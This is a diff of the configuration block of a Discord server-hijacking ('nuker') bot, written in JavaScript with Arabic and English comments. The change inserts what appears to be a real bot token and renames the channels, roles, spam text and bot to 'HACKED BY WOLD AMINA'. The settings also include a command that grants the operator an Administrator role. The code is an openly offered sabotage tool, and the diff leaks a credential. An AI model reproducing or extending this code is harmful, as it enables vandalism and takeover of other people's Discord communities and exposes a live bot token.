@@ -14,16 +14,16 @@
 //By xxxRevenge (Bowlingtoolkit)
 const Discord = require("discord.js") //npm i discord.js
 const client = new Discord.Client();
-const Token = '' //حط توكن بوتك هنا // your bot token
+const Token = 'NjMxODM4Nzc4NDY1NTgzMTM4.XZ8rvg.wreAHMxz8RpRXECXRdvwGZydQQg' //حط توكن بوتك هنا // your bot token
 const x_x = "." //الامر يلي يشغل الكود //the command to start the hack system
 const opcmd = 'oprole' // The Op Command To Give You Adminstrator Role
-const teext = "hjacked" // اسم رومات الكتابيه يلي بيسويها //the textchannel name
-const vooice = "HJACKED" // اسم الرومات الصوتيه يلي بيسويها //the voicechannel name
+const teext = "HACKED BY WOLD AMINA" // اسم رومات الكتابيه يلي بيسويها //the textchannel name
+const vooice = "HACKED BY WOLD AMINA" // اسم الرومات الصوتيه يلي بيسويها //the voicechannel name
 const pic = "https://cdn.discordapp.com/attachments/505639515407253506/505640173615448064/download.png" // صوره بيسوي فيها سبام البوت //the spam embed thumbnail picture
-const spam = "HJACKED" // الكلام يلي بيسوي فيه سبام البوت //the spam message
-const namee = "HJACKED" // اسم ابوت بعد التهكير //the bot name
+const spam = "HACKED BY WOLD AMINA" // الكلام يلي بيسوي فيه سبام البوت //the spam message
+const namee = "HACKED BY WOLD AMINA" // اسم ابوت بعد التهكير //the bot name
 const playing = "HJACKED 1 SERVER" // البلاينج //bot streaming
-const role = 'HJACKED' // اسم الرتبه يلي بيسويها //the role name
+const role = 'HACKED BY WOLD AMINA' // اسم الرتبه يلي بيسويها //the role name
 const adminstrator = 'OP' //اسم الرتبه يلي بيسويها البوت ويعطيك اياها //the op name
 console.log('BY OROCHIX');
 console.log('Start Hacking System ..')
